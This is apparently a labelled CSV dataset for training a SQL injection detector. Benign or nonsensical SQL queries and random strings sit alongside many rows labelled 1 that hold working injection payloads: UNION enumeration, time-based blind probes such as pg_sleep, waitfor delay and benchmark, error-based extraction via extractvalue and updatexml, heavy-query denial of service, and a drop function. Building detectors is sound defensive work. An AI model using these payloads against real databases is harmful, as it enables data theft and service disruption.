query,label
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ),1
select * from customersfetch first 3 rows only; select top 50 percent * from customers;select * from customers,0
select distinct bare from fun,0
"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",1
"select * from zulu order by height asc, remove desc",0
select count ( * )  as growth,0
select avg ( greatest ) from doctor select sum ( route ),0
trbena,0
"1%""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""%""  =  """,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'pwuy'  =  'pwuy",1
"select * from very where found in  ( 'wash', 'struck', 'powerful' )",0
select * from sold order by hot,0
delete from steam where feel = 'tide',0
"1' where 3612  =  3612 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
"1%"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
delete from push,0
"select column_name ( s )  from blue,pressure",0
"select dull as species, recently as [original]  from badly",0
"select social,great,dress from body left join orders on so.betweenid =  clean.sheep order by won.are",0
paula pladellorens,0
"select * from users where id  =  '1' or \.<\ union select 1,@@version -- 1'",1
"1%' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
nagel ordoes,0
1'+  (  select qugu where 2287  =  2287 order by 1#,1
18540,0
"select column_name ( s )  from please,lucky",0
1  )   where 3936  =  3936,1
abietceo,0
select wp_posts.* from wp_posts where id in  ( 367589 ),0
"select column_name ( s )  from location,arrangement",0
"1%""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  """,1
"select are as rod, fence as [worker]  from swung",0
p0n64793a,0
"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",1
"select grade, letter, cavefrom being where arrange  is not null",0
"select * from right where meant between ""cotton"" and    ""sort""",0
"select even, bus+ ', ' + shoulder+ ' ' + flew+ ', ' + there as oil  from flight",0
65236882g,0
"1""  )   where 7513  =  7513 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""%""  =  """,1
select * from hold where price not between 10 and 20,0
2.72034e+15,0
"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",1
"select makedate ( 2017, 3 ) ;",0
"-6160'   )    )     )   or make_set  (  1924  =  4415,4415  )   and    (    (     (  'hayr'  =  'hayr",1
"select explainid as id, beautiful as eager from with",0
"1""   )    )    as vtad where 3653  =  3653 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
select * from president fetch first 50 percent rows only,0
)  ;waitfor delay '0:0:__time__'--,1
"1'||  (  select 'yhkt' from dual where 7105  =  7105 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'",1
magrath,0
"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",1
select * from salt where not stage = 'examine'  and not day = 'alphabet',0
"select mileid as id, limited as come from wish",0
me73ga,0
"1'  )   as yhgk where 9246  =  9246 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
select human ( s )  from sheet full outer join,0
"select employees.tape, count ( orders.vegetableid )  as weekfrom    ( ordersinner join volume on orders.effectid  =  employees.numberid )",0
"select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",1
select top 3 * from people where sheep = 'tube' select * from enemy,0
select top 3 * from suppose select * from stairs 3select * from sharp,0
select * from pocket fetch first 50 percent rows only,0
select serve,0
1   )    )    as wwkw where 7289  =  7289 and 7533  =  7533--,1
"1"" where 6325  =  6325 union all select null,null,null,null,null,null,null,null,null,null#",1
"1""  )   union all select null#",1
laguna abusaid,0
-8716'  )   where 5523  =  5523 or 3686  =  8485--,1
select * from roar,0
1'   )    )     )   and 9198  =  9198--,1
corera,0
"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'cdaq' like 'cdaq",1
"1'||  (  select 'qrle' from dual where 9239  =  9239 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1
42462633x,0
"1%""   )    )     )   and 2006  =  2006",1
"select insert ( ""w3schools.com"", 1, 9, ""example"" ) ;",0
select * from dress where memory not between 'knowledge' and 'broke',0
select * from particular,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537",1
select column_names from table_name where column_name is null;,0
jarad,0
"1 union all select null,null,null,null,null,null,null,null,null#",1
"grup de la pau, 108,",0
roni,0
agujer4e2o,0
select * from smile fetch first 3 rows only select top 50 percent * from order,0
select soldier ( s )  from pitch full outer join,0
if  (  1665  =  3845  )   select 1665 else drop function nzod--,1
select * from modern 3 select * from post,0
select * from either where shinning = 'up'  or ear = 'metal',0
select count ( own ) from breeze,0
select pass from rise,0
select * from somewhere 3,0
"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""aixs""  =  ""aixs",1
select * from should where price not between 10 and 20,0
garek,0
select * from communication_links where id = 1 and 1=1 and id = 1,1
"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",1
morlanes funosa,0
malott,0
"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",1
barlas,0
or '1'  =  '1'--,1
select * from figure where moving = 'view' limit 3,0
select * from rod where official between piano09/01/1996real and minerals15/31/1996widely,0
-1765'  )   order by 1--,1
"end and    (    (   ""%""  =  """,1
"select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",1
select scared ( s )  from power,0
teodosio,0
"select pg_sleep  (  5  )   and    (    (   ""%""  =  """,1
"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )",1
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 9369 )  order by meta_id asc",0
"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",1
"1 where 1656  =  1656 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"select leg,group,travel from shelter left join orders on chest.solidid =  could.frozen order by fear.so",0
diffring9@discon.cv,0
select * from born fetch first 50 percent rows only,0
select count ( design )  from begun,0
select count ( second )  from inside,0
"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
select especially from hello union select composition from environment order by block,0
"select produce,wild,nearly,necessary,when     (  (  statement join himself on found.voice =  that.poem )   inner join swepton orders.college =  if.creamid )",0
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",1
"select occur,clothes from oil where remain = 'quarter' union select plane, zipper from zoo",0
9ar5i04o,0
g5adae3a,0
select * from cloud where quiet between '1996-07-01' and '1996-07-31',0
select top 50 percent * from crack,0
select * from battery_status where id = 1 or 1=1,1
select * from slow fetch first 50 percent rows only,0
select * from easier where soon = 'hunt'  or minerals = 'from',0
"select cattle, post, sidesfrom breathing where tropical  is not null",0
"-3130'   )    )     )   union all select 2886,2886,2886,2886,2886,2886,2886#",1
{s,1
1'  )   as xwlf where 9424  =  9424,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""%""  =  """,1
select productname from products where productid  =  any,0
select spider ( s )  from settlers union,0
1 where 8398  =  8398,1
select * from  ( select sheet from southern ),0
select * from slightly where mixture = 'she' limit 3,0
"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,1
"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1   )    )    as dqfl where 7527  =  7527,1
select doctor ( s )  from able union all,0
select length ( s ) from anyone inner join,0
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'zcrh'  =  'zcrh",1
select count ( rapidly ) from together,0
select * from blanket  where merely not like '[noon]%',0
select   (  case when   (  5856  =  7176  )   then 5856 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
s-ierro,0
select avg ( been ) from mine select sum ( cookies ),0
"select employees.brass, count ( orders.importantid )  as powderfrom    ( ordersinner join lonely on orders.wayid  =  employees.definitionid )",0
"select language,like,clothing,relationship,useful     (  (  melted join plural on row.limited =  master.consist )   inner join currenton orders.construction =  clearly.collectid )",0
"select * from boat where equipment not in  ( 'calm', 'blue', 'except' )",0
"insert into fact ( difficult, wherever, movie, page, twice, mistake )  values  ( 'collect', 'park'. room', 'army', 'grow', 'shall', 'board' )",0
whitehur,0
select * from market where beautiful = 'thus'  or crowd = 'is',0
"calle pea de francia, 58,",0
select * from battery_status where id = 1; select * from battery_status,1
select * from imagine order by practice,0
select enter ( s )  from funny left join,0
"1%""   )    )    and sleep  (  5  )  #",1
c/ castaos 55 6-g,0
5ictoriosamente,0
select top 3 * from foreign,0
"1""  )   where 1673  =  1673 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
es3regamiento,0
albeta,0
"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""lsca"" like ""lsca",1
"1""  )   as ssbz where 8885  =  8885 union all select null,null,null,null,null,null,null,null,null--",1
zarpanel,0
select * from positive where third = 'outline',0
85009456f,0
"-6412   )    )    as cnfs where 6557  =  6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",1
"1"" and   (  3020  =  3020  )  *6703 and ""itpt""  =  ""itpt",1
"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",1
select chemical ( s )  from offer union,0
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  9841  =  9841",1
1'||  (  select 'lmsc' from dual where 1162  =  1162 order by 1--,1
select saved,0
1'||  (  select 'glyc' from dual where 4058  =  4058,1
1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"select promised, additional, learn from value where order  is null",0
select flag from directly union all select combination from swim order by triangle,0
"1"" where 5927  =  5927",1
select * from fat 3 select * from dead,0
select * from like fetch first 50 percent rows only,0
select top 3 * from gravity where men = 'her',0
lladurs,0
1'||  (  select 'zyvk' from dual where 2072  =  2072,1
select * from take 3,0
"-8209  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
select * from southern where almost = 'broken' limit 3,0
select ucase ( customername )  as uppercasecustomername from customers;,0
"1""  )   where 7471  =  7471 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
select doing ( s )  from largest,0
"-6017 union all select 8449,8449,8449--",1
select avg ( describe ) from cat,0
"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",1
select * from bark 3,0
select * from pair where price not between 10 and 20,0
select * from port where sent = 'root'  and  ( laid = 'rays' or point = 'against' ),0
"1%"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  """,1
